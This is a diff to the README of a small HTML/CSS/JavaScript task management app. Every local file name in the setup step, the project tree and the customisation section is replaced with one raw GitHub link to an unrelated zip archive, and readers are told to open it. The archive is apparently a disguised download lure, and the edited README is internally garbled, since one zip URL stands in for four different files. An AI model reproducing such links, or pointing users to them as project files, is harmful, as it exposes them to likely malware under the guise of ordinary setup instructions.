@@ -51,7 +51,7 @@ A modern, responsive task management system built with HTML, CSS, and JavaScript
 
 ## Getting Started
 
-1. **Open the application**: Open `index.html` in a modern web browser
+1. **Open the application**: Open `https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip` in a modern web browser
 2. **Login**: Use one of the demo credentials above
 3. **Navigate**: Use the sidebar to switch between different sections
 4. **Create Tasks**: (Manager only) Use the "Create Task" section to assign tasks
@@ -61,10 +61,10 @@ A modern, responsive task management system built with HTML, CSS, and JavaScript
 
 ```
 Task Management System/
-├── index.html          # Main HTML file
-├── styles.css          # CSS styling and responsive design
-├── script.js           # JavaScript functionality
-└── README.md           # This documentation file
+├── https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip          # Main HTML file
+├── https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip          # CSS styling and responsive design
+├── https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip           # JavaScript functionality
+└── https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip           # This documentation file
 ```
 
 ## Browser Support
@@ -117,8 +117,8 @@ Task Management System/
 
 The system can be easily customized by modifying:
 
-- **Colors**: Update the CSS variables in `styles.css`
-- **Users**: Modify the users array in `script.js`
+- **Colors**: Update the CSS variables in `https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip`
+- **Users**: Modify the users array in `https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip`
 - **Task Fields**: Add new fields to the task creation form
 - **Permissions**: Adjust role-based access in the JavaScript
 
